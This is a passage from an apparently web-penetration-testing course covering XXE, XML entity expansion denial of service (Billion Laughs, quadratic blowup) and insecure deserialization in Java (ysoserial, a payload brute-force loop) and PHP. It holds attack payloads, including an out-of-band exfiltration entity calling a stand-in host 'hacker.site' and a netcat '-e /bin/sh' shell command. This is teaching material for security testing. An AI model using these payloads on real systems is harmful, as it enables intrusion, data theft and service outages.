<span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">LoadOOBEnt</span> <span class="hljs-attr">SYSTEM</span> "&lt;!<span class="hljs-attr">ENTITY</span> &amp;#<span class="hljs-attr">x25</span>; <span class="hljs-attr">resource</span> <span class="hljs-attr">SYSTEM</span> '<span class="hljs-attr">http:</span>//<span class="hljs-attr">hacker.site</span>/?<span class="hljs-attr">p</span>=<span class="hljs-string">%resource;</span>'&gt;</span>"&gt;</span>
</code></pre>
<h2 id="-xml-entity-expansion-"><strong>XML Entity Expansion</strong></h2>
<p>In addition to XXE, another attack that uses the capabilities of XML DTDs to create custom entities is XML Entity Expansion (XEE). The key difference between these attacks is their goal: XEE is a <strong>Denial Of Service attack</strong>.</p>
<h3 id="-recursive-entity-expansion-"><strong>Recursive Entity Expansion</strong></h3>
<p>The best way to introduce this type of DoS is by presenting the most well-known XEE attack: the &quot;Billion laughs&quot;.</p>
<p>The attack exploits XML parsers into exponentially resolving sets of small entities. This is done in order to explode the data from a simple lol string to a billion lol strings.</p>
<pre><code class="lang-xml"><span class="hljs-params">&lt;?xml version="<span class="hljs-number">1.0</span>"?&gt;</span>
<span class="hljs-params">&lt;!DOCTYPE lolz [
  &lt;!ENTITY lol "lol"&gt;</span>
  <span class="hljs-params">&lt;!ENTITY lol1 "<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol</span>;<span class="hljs-variable">&amp;lol1</span>;"&gt;</span>
  <span class="hljs-params">&lt;!ENTITY lol2 "<span class="hljs-variable">&amp;lol1</span>;<span class="hljs-variable">&amp;lol1</span>;<span class="hljs-variable">&amp;lol1</span>;<span class="hljs-variable">&amp;lol1</span>;<span class="hljs-variable">&amp;lol1</span>;<span class="hljs-variable">&amp;lol1</span>;<span class="hljs-variable">&amp;lol1</span>;<span class="hljs-variable">&amp;lol1</span>;"&gt;</span>
  <span class="hljs-params">&lt;!ENTITY lol3 "<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;<span class="hljs-variable">&amp;lol2</span>;"&gt;</span>
  …
  <span class="hljs-params">&lt;!ENTITY lol9 "<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;<span class="hljs-variable">&amp;lol8</span>;"&gt;</span>
]&gt; 
<span class="hljs-params">&lt;lolz&gt;</span><span class="hljs-variable">&amp;lol9</span>;<span class="hljs-params">&lt;/lolz&gt;</span>
</code></pre>
<p>As you can see, this attack requires an exponential amount of space. According to Microsoft reports , this can grow to approximately 3GB of memory and that’s quite a large amount of memory utilization and obviously quite devastating!</p>
<h3 id="-generic-entity-expansion-"><strong>Generic Entity Expansion</strong></h3>
<p>Another type of DoS attack is the Quadratic Blowup Attack. While Billion Laughs requires a recursive entity expansion approach, this one is based on a custom entity string containing an extremely long value.</p>
<h4 id="-quadratic-blowup-attack-"><strong>Quadratic Blowup Attack</strong></h4>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE strings [&lt;!ENTITY looong "CRAZY_SUPER_SUPER_LONG_LONG_STRING"&gt;]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">strings</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">s</span>&gt;</span>Let's create a &amp;looong; &amp;looong; string
  &amp;looong;&amp;looong;&amp;looong;&amp;looong;&amp;looong;&amp;looong;&amp;looong; …
  …
  <span class="hljs-tag">&lt;/<span class="hljs-name">s</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">strings</span>&gt;</span>
</code></pre>
<h3 id="-remote-entity-expansion-"><strong>Remote Entity Expansion</strong></h3>
<p>Of course, we can move the entities definition from the local DTD to an external one. This can be seen as a way to obfuscate the malicious attack in an innocuous request.</p>
<pre><code class="lang-xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
<span class="hljs-meta">&lt;!DOCTYPE results [
   &lt;!ENTITY crazystuff SYSTEM "http://hacker.site/entitydos.xml"&gt;
]&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">results</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>Check it out: &amp;crazystuff;<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">results</span>&gt;</span>
</code></pre>
<h2 id="-labs-"><strong>Labs</strong></h2>
<ul>
<li><a href="https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection">https://portswigger.net/web-security/all-labs#xml-external-entity-xxe-injection</a></li>
<li><a href="https://gosecure.github.io/xxe-workshop/#0">https://gosecure.github.io/xxe-workshop/#0</a></li>
<li><a href="https://github.com/jbarone/xxelab">https://github.com/jbarone/xxelab</a></li>
<li><a href="https://github.com/icchy/xxe-lab">https://github.com/icchy/xxe-lab</a></li>
<li><a href="http://github.com/Yavuzlar/VulnLab">http://github.com/Yavuzlar/VulnLab</a></li>
</ul>
<hr>
<h1 id="-attacking-serialization-"><strong>Attacking Serialization</strong></h1>
<h2 id="-what-is-serialization-"><strong>What is Serialization?</strong></h2>
<p><strong>Serialization</strong> is the name of the mechanism that allows us to store the state of programmistic objects in a sequence of bytes in a reversible way. This way, an object (a variable, set of variables, or even a whole class) can be transported remotely to another program.</p>
<p>The receiving endpoint should be able to reconstruct (<strong>deserialize</strong>) the received object in an unchanged state.</p>
<p>Serialization is used widely in programming and can be used for:</p>
<ul>
<li>Storing and transferring data</li>
<li>Calling remote procedures (RPC-like methods)</li>
</ul>
<p>Serializing data is also often referred to as <strong>marshalling</strong>. The reverse process of retrieving the original object out of a byte sequence is called <strong>deserialization</strong> or <strong>unmarshalling</strong>.</p>
<p>It should be noted that serialized data itself is not encrypted or signed in any way. Often, the data might be freely tampered with once spotted, which might bring unexpected results on the deserializing component.</p>
<p>Of course, there might be transport protocols that utilize serialization together with compression or encryption. So, serialized data might be hidden, secured or encountered in a plain form. The last case is the most interesting for both penetration testers and attackers.</p>
<p>Serialized objects are most often encountered in web applications written in PHP, Java, and .NET, but serialization is not limited to these languages only. For example, there were occurences of remote code execution via deserialization in Python, Ruby, and many other languages.</p>
<p>At the end of this module, we will present various cases of untypical serialization that can be met during web application penetration testing.</p>
<p>Be aware that serialization might not only be present on the web application layer.</p>
<h2 id="-serialization-in-java-"><strong>Serialization in Java</strong></h2>
<p>Before we dig into exploiting insecure deserialization, let’s try to create a serialized object to understand the proces better.</p>
<p>Once set up, we will use the Java commandline compiler (javac) in order to compile the source files. They should be created with a .java extension. Moreover, the file name should be the same as the name of the class inside that file; this is a common practice when coding in Java.</p>
<p>We will create two files:</p>
<ul>
<li><strong>Item.java</strong>, which will hold code for a class named Item.</li>
<li><strong>Serialize.java</strong>, which will contain the serialization logic.<h3 id="-creating-serialized-objects-"><strong>Creating Serialized Objects</strong></h3>
</li>
</ul>
<p>In order to use serialization, the program must import the <strong>java.io.Serializable</strong> package. Moreover, for the class to be serialized, it must implement a <strong>Serializable</strong> interface.</p>
<pre><code class="lang-java"><span class="hljs-comment">// Item.java</span>
<span class="hljs-keyword">import</span> java.io.Serializable;
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Item</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Serializable</span> </span>{
    <span class="hljs-keyword">int</span> id;
    String name;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Item</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id, String name)</span> </span>{
        <span class="hljs-keyword">this</span>.id = id;
        <span class="hljs-keyword">this</span>.name = name;
    }
}
</code></pre>
<p><strong>Item.java</strong> is a simple class that has two fields: id and name. In real-life, serializable classes can contain many fields and methods.</p>
<p>Now, we will use another file (in Java one class should be contained in one file) that will make use of that class. First, it will create an instance of the Item class, and then serialize that instance as well as save it to a file.</p>
<p>The Serialize class makes use of the Item class, as it converts the instance of the Item class to a <strong>Stream of Bytes</strong>. Then, it is saved to a file called &quot;data.ser&quot;.</p>
<pre><code class="lang-java"><span class="hljs-comment">// Serialize.java</span>
import java.io.*;
<span class="hljs-keyword">class</span> <span class="hljs-title">Serialize</span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String args[]</span>)</span>{
        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">//Creating the object</span>
            Item s1 = <span class="hljs-keyword">new</span> Item(<span class="hljs-number">123</span>,<span class="hljs-string">"book"</span>);
            <span class="hljs-comment">//Creating stream and writing the object</span>
            FileOutputStream fout = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">"data.ser"</span>);
            ObjectOutputStream <span class="hljs-keyword">out</span> = <span class="hljs-keyword">new</span> ObjectOutputStream(fout);
            <span class="hljs-keyword">out</span>.writeObject(s1);
            <span class="hljs-keyword">out</span>.flush();
            <span class="hljs-comment">//closing the stream</span>
            <span class="hljs-keyword">out</span>.close();
            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"Serialized data saved to data.ser"</span>);
        } <span class="hljs-keyword">catch</span>(Exception e){
            System.<span class="hljs-keyword">out</span>.println(e);
        }
    }
}
</code></pre>
<p>Before compilation, make sure that the two .java files are in the same directory.</p>
<pre><code class="lang-bash"><span class="hljs-selector-tag">javac</span> <span class="hljs-selector-tag">Item</span><span class="hljs-selector-class">.java</span> <span class="hljs-selector-tag">Serialize</span><span class="hljs-selector-class">.java</span>
</code></pre>
<p>We can see that the saved data.ser file is in binary format. Apart from some strings that disclose what the serialized data might be, there are also some non-ASCII characters.</p>
<pre><code class="lang-bash">$ <span class="hljs-keyword">strings </span><span class="hljs-meta">data</span>.ser
<span class="hljs-keyword">ItemZ,
</span><span class="hljs-symbol">namet</span>
<span class="hljs-symbol">Ljava</span>/lang/<span class="hljs-keyword">String;xp
</span><span class="hljs-keyword">book
</span>
$ file <span class="hljs-meta">data</span>.ser
<span class="hljs-symbol">data.ser</span>: Java Serialization <span class="hljs-meta">data</span>.
</code></pre>
<p>The file begins with the <code>ac ed 00 05</code> bytes, which is a standard java serialized format signature. Wherever you see binary data starting with those bytes, you can suspect that it contains serialized java objects.</p>
<p>As java serialized data is in binary format, when used in web applications, it is often encoded using <strong>Base64</strong> in order to mitigate non-ASCII bytes. When inspecting web applications for java serialized objects, you should also look for base64 strings starting with &quot;<strong>rO0AB</strong>&quot;.</p>
<pre><code class="lang-bash">$ echo -en "<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>ed<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>05" | base64
rO0ABQ==
</code></pre>
<p>Going back to our serialized object, let’s write code that will retrieve the serialized data out of the binary file. The file will be named <strong>Deserialize.java</strong>.</p>
<pre><code class="lang-java"><span class="hljs-comment">// Deserialize.java</span>
import java.io.*;
<span class="hljs-keyword">class</span> <span class="hljs-title">Deserialize</span>{
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span>(<span class="hljs-params">String args[]</span>)</span>{
        <span class="hljs-keyword">try</span>{
            <span class="hljs-comment">//Creating stream to read the object</span>
            ObjectInputStream <span class="hljs-keyword">in</span>=<span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"data.ser"</span>));
            Item s=(Item)<span class="hljs-keyword">in</span>.readObject();
            <span class="hljs-comment">//printing the data of the serialized object</span>
            System.<span class="hljs-keyword">out</span>.println(s.id+<span class="hljs-string">" "</span>+s.name);
            <span class="hljs-comment">//closing the stream</span>
            <span class="hljs-keyword">in</span>.close();
        } <span class="hljs-keyword">catch</span>(Exception e) {
            System.<span class="hljs-keyword">out</span>.println(e);
        }
    }
}
</code></pre>
<h3 id="-deserializing-data-"><strong>Deserializing Data</strong></h3>
<p>After compilation and running the Deserialize class, we can see that the object was properly reconstructed.</p>
<pre><code class="lang-bash">$ <span class="hljs-keyword">javac </span>Deserialize.<span class="hljs-keyword">java
</span>$ <span class="hljs-keyword">java </span>Deserialize

<span class="hljs-number">123</span> <span class="hljs-keyword">book</span>
</code></pre>
<h3 id="-insecure-deserialization-conditions-"><strong>Insecure Deserialization Conditions</strong></h3>
<p>When serializing and deserializing data, the deserializing endpoint must know (this means, it has to <strong>include in its classpath</strong> or <strong>import</strong>) all the classes and packages that the serialized object consists of.</p>
<p>Basically, attacking Java serialization is about passing the <strong>malicious state</strong> of an object to the deserializing endpoint.</p>
<p>Executing OS commands in Java could be done, for example, by invoking code like:</p>
<pre><code class="lang-java">Java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Runtime</span><span class="hljs-selector-class">.getRuntime</span><span class="hljs-selector-class">.exec</span>(<span class="hljs-string">"whoami"</span>)
</code></pre>
<p>But in order to make the deserializing endpoint execute the above code, it should be enclosed in a serialized object’s property.</p>
<h4 id="-properties-and-reflection-"><strong>Properties and Reflection</strong></h4>
<p>An Object’s Properties in their simplest form are spotted in the format below:</p>
<ul>
<li>Object.one.two</li>
</ul>
<p>Reading from right to left you can traverse the name and know that:</p>
<ul>
<li>Two is a property of one</li>
<li>One is a property of Object</li>
</ul>
<p>During deserialization, the object’s properties are accessed recursively, leading to code execution at the very end of this process. An opaque class order that allows chaining subsequent classes is possible thanks to reflection , which allows us to use methods without knowing them previously. Reflection can be recognized by the „opaque” calling order in the code.</p>
<h3 id="-gadgets-"><strong>Gadgets</strong></h3>
<p>Every property or method that is part of a nested exploit object is called a <strong>gadget</strong>. There are some specific Java libraries that were identified to contain some universal gadgets used to build serialized exploit objects. These libraries are called <strong>gadget libraries</strong>.</p>
<p>The concept of gadgets was first presented at the following talk. <a href="https://frohoff.github.io/appseccali-marshalling-pickles/">https://frohoff.github.io/appseccali-marshalling-pickles/</a></p>
<blockquote>
<p>[!Note]
Deep understanding of manually building Java gadgets is an advanced skill that is not required to exploit most java deserialization vulnerabilities. However, it can come in handy when a custom library is encountered, or patches have been applied.</p>
</blockquote>
<p>There is a set of common libraries that were identified as gadget libraries. This does not mean that they are insecure by design. It only means that in case insecure deserialization is performed while these libraries are loaded into the classpath of the running application, the attacker can abuse them to construct a known gadget chain that will result in successful exploitation.</p>
<p>For example, common libraries that were identified as vulnerable are <strong>CommonsCollections</strong> (versions 1-6). There is a powerful tool named ysoserial that can be used to perform exploitation of insecure java deserialization vulnerabilities. Ysoserial contains multiple modules that can suit various Java deserialization exploitation scenarios.</p>
<p><strong>Ysoserial</strong> can be downloaded from its <a href="https://github.com/frohoff/ysoserial">github repository</a>.</p>
<h3 id="-introduction-to-ysoserial-"><strong>Introduction to Ysoserial</strong></h3>
<p>Ysoserial can be downloaded, along with the source code and a precompiled .jar file. We will use the <a href="https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar">precompiled jar</a>.</p>
<p>Usage of ysoserial is quite straightforward. <code>java –jar ysoserial.jar</code> displays the help message. .</p>
<p>The Ysoserial payload is in binary format. Often, you will need to convert the output to base64 in order to be able to send it to an application, as in the web application world binary data is often base64-encoded.</p>
<pre><code class="lang-bash"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsCollections1 <span class="hljs-string">"whoami"</span>
</code></pre>
<pre><code class="lang-bash"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial.<span class="hljs-keyword">jar </span>CommonsCollections1 <span class="hljs-string">"whoami"</span> <span class="hljs-title">| base64</span>
</code></pre>
<p>The command above generates a serialized payload, that upon being insecurely deserialized by an application that includes CommonsCollections1 in its classpath, will result in executing the command „whoami”.</p>
<p>The payload names displayed in the help message are Library names that the gadgets will be taken from. If you suspect that the deserializing endpoint makes use of any of those libraries, you can use it.</p>
<blockquote>
<p>[!Note]
Whoami is a versatile command that will work on both linux and windows systems, but in the case of a remote deserializing endpoint you will need to discover or guess the underlying OS yourself.</p>
<h4 id="-additions-to-ysoserial-"><strong>Additions to Ysoserial</strong></h4>
</blockquote>
<p>Ysoserial is the most common and the most versatile tool for generating java deserialization payloads. However, its usage is not the most convenient when assessing web applications due to being a command line script.</p>
<p>Several Burpsuite Pro extensions have been developed in order to make Java serialization detection and exploitation easier.</p>
<p>Such extensions are:</p>
<ul>
<li><a href="https://portswigger.net/bappstore/ae1cce0c6d6c47528b4af35faebc3ab3">Freddy, Deserialization Bug Finder</a></li>
<li><a href="https://portswigger.net/bappstore/228336544ebe4e68824b5146dbbd93ae">Java Deserialization Scanner</a><h3 id="-brute-force-attack-with-ysoserial-"><strong>Brute-force Attack with Ysoserial</strong></h3>
</li>
</ul>
<p>When approaching an application that utilizes serialized java data, we do not know what libraries are used by the back end. In such a case, a brute-force approach might be rewarding. You might want to generate all possible ysoserial payloads and then try each of them against the target software.</p>
<p>A brute-force approach can be performed using a script similar to the below. Assume that payloads.txt contains all ysoserial payload names, one per line.</p>
<pre><code class="lang-bash"><span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> payload;
<span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -en <span class="hljs-string">"<span class="hljs-variable">$payload</span>\n\n"</span>;
java -jar ysoserial.jar <span class="hljs-variable">$payload</span> <span class="hljs-string">"whoami"</span> | base64 | tr <span class="hljs-_">-d</span> <span class="hljs-string">'\n'</span> &gt; payloads/<span class="hljs-variable">$payload</span>.ser;
<span class="hljs-built_in">echo</span> -en <span class="hljs-string">"------------------------------\n\n"</span>;
<span class="hljs-keyword">done</span> &lt; payloads.txt
</code></pre>
<p>The script will run and create a base64-encoded serialized payload for each vulnerable library. The result files can be further used in Burp Intruder attacks.</p>
<blockquote>
<p>However, you might notice that some of the payloads cause yoserial to throw an error. This is because some payload names must be used in a specific way.</p>
<h3 id="-exploring-ysoserial-"><strong>Exploring Ysoserial</strong></h3>
</blockquote>
<p>In order to uncover hidden features of the ysoserial tool, we need to dive into its source code.</p>
<p>Each of the .java files can be run as a separate java class, resulting in executing different code by the ysoserial tool. For example, based on the names of the Java classes that ysoserial contain, we can infer what they were built for.</p>
<p>A jar file, the format in which ysoserial is shipped, is a regular zip archive that can be unpacked. Due to this feature of Java, it is possible to select and invoke a single method out of a jar archive.</p>
<p>In order to do that, we need to use the command line java utility with the <code>–cp</code> (classpath) argument.</p>
<p>The classpath contains all locations where the java virtual machine will look for methods available for the process runtime. In that case, we need to specify the ysoserial .jar file as the classpath.</p>
<p>The Java .jar archives have a package structure; the package contains subsequent packages. In the case of ysoserial, the current package is named ysoserial, and inside the jar file there is a folder exploit that contains several classes. Each of these classes contain an exploit utility.</p>
<p>In order to use ysoserial/exploit/JSF.java, out of the classpaths, we need to issue the following command line:</p>
<pre><code class="lang-bash">java–cp ysoserial<span class="hljs-selector-class">.jar</span> ysoserial<span class="hljs-selector-class">.exploit</span><span class="hljs-selector-class">.JSF</span>
</code></pre>
<p>The JSF payload can be used to attack serialization in Java Faces’ VIEWSTATE parameter. Keep in mind, that we omit the .java extension, which is assumed by default by the java environment.</p>
<h3 id="-troubleshooting-ysoserial-"><strong>Troubleshooting Ysoserial</strong></h3>
<p>You should be aware that there could be different reasons for the code execution payloads to fail when using ysoserial.</p>
<p>When attacking a serialization mechanism using ysoserial and aiming for code execution, lots of exceptions might occur. In order to be able to confirm whether the application is secure or not, you should be familiar with the exception types that can be thrown during the attacking process.</p>
<p>Ysoserial is a blind exploitation tool, so apart from DNS resolution, knowing exception types might help in assessing a potential attack surface. When attacking, you should be aware of where the exception comes from. Ysoserial itself prints verbose stack traces when used incorrectly.</p>
<p>When reading the stack trace, if you encounter a <strong>ClassNotFoundException</strong>, it is likely that the target application does not utilize the gadget library used by the ysoserial payload. You can then try to use a different payload that targets another library.</p>
<p>On the other hand, if you encountered <strong>java.io.IOException</strong> with the message „Cannot run program”, this is a good sign because your payload worked. However, the application you wanted to call is unavailable for some reason (e.g. it does not exist).</p>
<p>When telling ysoserial to create an RCE-related payload, you should be aware of its limitations below.</p>
<ul>
<li>Output redirections and pipes are not supported.</li>
<li>Parameters to the command cannot contain spaces; so, while <code>nc –lp 4444 –e /bin/sh</code> is ok, <code>python –c ‚import socket;…</code> will not work because the parameter (import socket) to Python contains a space.<h3 id="-recommended-reading-"><strong>Recommended Reading</strong></h3>
</li>
</ul>
<p>You can find more on exploiting Java Deserialization below.</p>
<ul>
<li><a href="https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet">The biggest java deserialization repository</a></li>
<li><a href="https://github.com/Coalfire-Research/java-deserialization-exploits">Collection of popular java deserialization exploits</a></li>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Java.md">More Java deserialization tips</a><h2 id="-serialization-in-php-"><strong>Serialization in PHP</strong></h2>
</li>
</ul>
<p>In terms of exploitation, abusing control over PHP serialized objects is also called „PHP Object Injection”.</p>
<p>It works in a similar way as Java deserialization – when the user has control over a PHP serialized object that is being sent to another deserializing endpoint, this fact may lead to unpredictable effects, including Remote Code Execution.</p>
<p>PHP uses the <code>serialize()</code> and <code>unserialize()</code> functions to perform serialization and, like in Java, (de)serialization is used to store, transfer and transform whole objects. Unlike Java, PHP Serialization is in non-binary format, looks similar to a JSON array and it is human-readable.</p>
<p>A PHP serialized string looks like the below:</p>
<pre><code class="lang-php"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:"Abcdef"</span><span class="hljs-selector-pseudo">:1</span>:{<span class="hljs-attribute">s</span>:<span class="hljs-number">9</span>:<span class="hljs-string">"Something"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"Active"</span>;}
</code></pre>
<p>PHP Serialized objects contain information about the type of object. This piece of information is necessary when reconstructing the object during deserialization. For example:</p>
<ul>
<li>Booleans are serialized as <code>b:&lt;i&gt;;</code>, where i is 0 or 1 (True / False).</li>
<li>Strings are serialized as <code>s:&lt;i&gt;:&quot;&lt;s&gt;&quot;;</code>, where i is the string length and s is the string itself.</li>
<li>Arrays are serialized as <code>a:&lt;i&gt;:{&lt;elements&gt;}</code>, where i is an integer representing the number of elements in the array, and elements are zero or more serialized key value pairs of the following form, <code>&lt;key&gt;&lt;value&gt;</code>.</li>
</ul>
<p>Objects (classes) are serialized as <code>O:&lt;i&gt;:&quot;&lt;s&gt;&quot;:&lt;i&gt;:{&lt;properties&gt;}</code>, where the first <code>&lt;i&gt;</code> is an integer representing the string length of <code>&lt;s&gt;</code> and <code>&lt;s&gt;</code> is the fully qualified class name.</p>
<ul>
<li>The second <code>&lt;i&gt;</code> is an integer representing the number of object properties, and <code>&lt;properties</code> are zero or more serialized name-value pairs.</li>
<li>In the <code>&lt;name&gt;&lt;value&gt;</code> pair, <code>&lt;name&gt;</code> is a serialized string representing the property name, and <code>&lt;value&gt;</code> is any value that is serializable.</li>
<li>Also, <code>&lt;name&gt;</code> is represented as <code>s:&lt;i&gt;:&quot;&lt;s&gt;&quot;;</code> where <code>&lt;i&gt;</code> is an integer representing the string length of <code>&lt;s&gt;</code>.</li>
</ul>
<p>The visibility of properties influences the value of <code>&lt;s&gt;</code> in the following ways:</p>
<ul>
<li>With public properties, <code>&lt;s&gt;</code> is the simple name of the property.</li>
<li>With protected properties, <code>&lt;s&gt;</code> is the simple name of the property, prepended with <code>\0*\0</code> - an asterix enclosed in two NULL bytes (0x00).</li>
<li>With private properties, <code>&lt;s&gt;</code> is the simple name of the property, prepended with <code>\0&lt;s&gt;\0</code> - <code>&lt;s&gt;</code> and enclosed in two NULL bytes, where <code>&lt;s&gt;</code> is the fully qualified class name.</li>
</ul>
<p>You can find more on the PHP serialized data format <a href="http://www.phpinternalsbook.com/php5/classes_objects/serialization.html">here</a> and <a href="https://www.geeksforgeeks.org/php-serializing-data/">here</a>. When assessing web applications, you might often encounter the PHP serialized data to be base64 encoded for transportation purposes. Never leave any base64 data uninspected!</p>
<p>As you already know how to recognize PHP serialized data, the next step will be to learn the available exploitation strategies. Unfortunately, PHP object injection is not as straightforward as its Java counterpart and depends heavily on the details of each vulnerability. Simply put, there is no ysoserial for php that gives you easy RCE. There are cases where the vulnerability will be easily exploitable and there will be cases when the vulnerability will require lots of creativity and effort.</p>
<p>Moreover, exploitation of PHP object injection relies heavily on how the unserialized data is further handled. Unserialized data is not necessarily used unless some <strong>magic methods</strong> are in place.</p>
<p>Magic methods are functions available to be used in PHP Object Oriented Programming. They are functions that are being launched dynamically once a certain trigger is present. They can be recognized in code by two underscores in the beginning of their names, for example, <code>__construct()</code>.</p>
<p>The triggers for the PHP classes are:</p>
<ul>
<li><code>__construct()</code> is loaded upon creating a new instance of a class</li>
<li><code>__destruct()</code> is loaded when no more references of a current class are present in memory</li>
<li><code>__wakeUp()</code> is loaded upon deserializing an object</li>
</ul>
<p>You can read more about PHP magic methods <a href="https://www.php.net/manual/en/language.oop5.magic.php">here</a>. Keep in mind how they work and consider the following code.</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
define(<span class="hljs-string">'LOG'</span>, <span class="hljs-string">'/tmp/'</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoLog</span> </span>{
    <span class="hljs-keyword">private</span> $filepath;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">$this</span>-&gt;filepath = LOG . <span class="hljs-string">"history.log"</span>;
        touch(<span class="hljs-keyword">$this</span>-&gt;filepath);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"\n[+] Logfile "</span> . (<span class="hljs-keyword">$this</span>-&gt;filepath) . <span class="hljs-string">" is being removed\n"</span>;
        unlink(<span class="hljs-keyword">$this</span>-&gt;filepath);
    }
}    
$log = <span class="hljs-keyword">new</span> DoLog();
var_Export(serialize($log));
<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>What the snippet of code does is:</p>
<ul>
<li>Upon creating a new instance of the class, it creates a log file (default constructor)</li>
<li>The file is then removed (default destructor)</li>
</ul>
<p>The file will also output serialized data about the created class object. Let’s run it to see the serialized output.</p>
<p>The output of the php class is as follows:</p>
<pre><code class="lang-bash">$ php a.php
<span class="hljs-string">O:</span><span class="hljs-number">5</span>:<span class="hljs-string">"DoLog"</span>:<span class="hljs-number">1</span>:{<span class="hljs-string">s:</span><span class="hljs-number">15</span>:<span class="hljs-string">"' . "</span>\<span class="hljs-number">0</span><span class="hljs-string">" . 'DoLog' . "</span>\<span class="hljs-number">0</span><span class="hljs-string">" . 'filepath"</span>;<span class="hljs-string">s:</span><span class="hljs-number">16</span>:<span class="hljs-string">"/tmp/history.log"</span>;}
[+] Logfile <span class="hljs-regexp">/tmp/</span>history.log is being removed
</code></pre>
<p>Let’s now modify the code by adding unserialization logic to it.</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
define(<span class="hljs-string">'LOG'</span>, <span class="hljs-string">'/tmp/'</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DoLog</span> </span>{
    <span class="hljs-keyword">private</span> $filepath;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">$this</span>-&gt;filepath = LOG . <span class="hljs-string">"history.log"</span>;
        touch(<span class="hljs-keyword">$this</span>-&gt;filepath);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"\n[+] Logfile "</span> . (<span class="hljs-keyword">$this</span>-&gt;filepath) . <span class="hljs-string">" is being removed\n"</span>;
        unlink(<span class="hljs-keyword">$this</span>-&gt;filepath);
    }
}    
$log = <span class="hljs-keyword">new</span> DoLog();
var_Export(serialize($log));

$serialized = <span class="hljs-string">'O:5:"DoLog":1:{s:15:"'</span> . <span class="hljs-string">"\0"</span> . <span class="hljs-string">'DoLog'</span> . <span class="hljs-string">"\0"</span> . <span class="hljs-string">'filepath";s:16:"/tmp/history.log";}'</span>;
$o = unserialize($serialized);

<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>Upon deserialization, the class’s magic methods will be run so that the file will be removed in the destructor function:</p>
<pre><code class="lang-bash">$ php a.php
